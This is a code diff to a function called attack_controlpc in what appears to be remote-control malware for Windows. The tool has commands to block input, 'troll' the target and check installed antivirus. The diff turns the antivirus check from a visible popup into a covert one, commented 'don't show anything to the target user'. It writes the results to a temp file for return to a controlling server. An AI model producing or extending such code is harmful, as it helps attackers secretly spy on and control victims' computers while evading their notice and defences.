@@ -311,7 +311,7 @@ def attack_controlpc(target, duration=60):
             ctypes.windll.user32.BlockInput(False)
             
         elif command == "check_av":
-            # Check installed antivirus
+            # Check installed antivirus - don't show anything to the target user
             import os
             import winreg
             
@@ -337,15 +337,15 @@ def attack_controlpc(target, duration=60):
                 except:
                     pass
             
-            # Show results in a popup
-            if av_list:
-                av_text = "\n".join(av_list)
-                import ctypes
-                ctypes.windll.user32.MessageBoxW(0, f"Installed AV:\n{av_text}", "AV Check", 0)
-            else:
-                import ctypes
-                ctypes.windll.user32.MessageBoxW(0, "No known antivirus detected", "AV Check", 0)
-                
+            # Instead of showing a popup, we'll send the results back to the server
+            # We'll use a special response format that the server can recognize
+            result_file = os.path.join(os.environ['TEMP'], 'av_result.txt')
+            with open(result_file, 'w') as f:
+                if av_list:
+                    f.write("ANTIVIRUS_RESULT:" + ",".join(av_list))
+                else:
+                    f.write("ANTIVIRUS_RESULT:No known antivirus detected")
+                    
         elif command == "troll":
             # Troll features
             if len(parts) > 1:
